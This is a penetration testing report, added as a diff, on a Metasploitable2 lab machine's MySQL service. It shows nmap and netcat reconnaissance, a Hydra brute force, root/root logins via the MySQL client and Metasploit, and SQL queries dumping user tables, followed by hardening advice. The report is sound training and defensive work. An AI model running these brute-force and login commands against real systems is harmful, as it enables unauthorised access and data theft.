@@ -1,0 +1,100 @@
+Penetration Testing Report – Metasploitable2 (Port 3306 - MySQL)
+
+1. Test Date : 20-06-25
+    Test by : [ me ]
+2. Target Information
+- Target IP: 192.168.1.101
+- Service: MySQL
+- Port: 3306/tcp
+- Database Version: MySQL 5.0.51a-3ubuntu5
+- Tools Used: Nmap, MySQL client, Metasploit, Hydra, sqlmap
+
+3. Reconnaissance
+
+3.1 Nmap Scan
+Command:
+nmap -sV -p 3306 192.168.1.101
+
+Output:
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
+
+Interpretation:
+An older version of MySQL is running. Version 5.0.51a is known to contain multiple vulnerabilities and may allow authentication bypass or remote access via default credentials.
+
+4. Enumeration
+
+4.1 Banner Grabbing
+Command:
+nc 192.168.1.101 3306
+
+Output:
+- Returns MySQL handshake
+- Confirms service is active
+
+4.2 Default Credentials Test
+Common usernames: root, admin, mysql
+Common passwords: (blank), root, admin
+
+5. Exploitation
+
+5.1 Brute Force with Hydra
+Command:
+hydra -L user.txt -P pass.txt 192.168.1.101 mysql
+
+Result:
+[3306][mysql] host: 192.168.1.101   login: root   password: root
+
+5.2 MySQL Client Access
+Command:
+mysql -h 192.168.1.101 -u root -p
+Password: root
+
+Result:
+- Access to MySQL CLI as root
+- Full access to all databases
+
+5.3 Metasploit Module (MySQL Login)
+msfconsole
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 192.168.1.101
+set USERNAME root
+set PASSWORD root
+run
+
+Result:
+[*] Login Successful: root / root
+
+5.4 Database Enumeration
+Commands run:
+SHOW DATABASES;
+USE dvwa;
+SHOW TABLES;
+SELECT * FROM users;
+
+Findings:
+- Extracted credentials from `dvwa.users`
+- Passwords stored in plaintext or weak hashes
+
+6. Post-Exploitation
+
+Data Exfiltration:
+- Exported user tables from `dvwa`, `mutillidae`, and other sample databases
+- Found default credentials reused across apps
+
+Privilege Escalation:
+- Access to `mysql.user` table confirmed root-level DB control
+- MySQL UDF privilege escalation possible (not tested)
+
+7. Recommendations
+
+- Change default MySQL root credentials immediately
+- Upgrade MySQL to a supported version
+- Bind MySQL to localhost or firewall external access
+- Remove test and demo databases (`dvwa`, `mutillidae`, etc.)
+- Disable remote root access (`skip-networking` or `bind-address = 127.0.0.1`)
+- Enforce password policies and least privilege for DB users
+
+8. Conclusion
+
+Port 3306 on 192.168.1.101 was hosting a vulnerable MySQL instance with default root credentials. Full database access was obtained, resulting in sensitive data exposure and potential further exploitation. This emphasizes the critical importance of hardening database configurations and credentials.
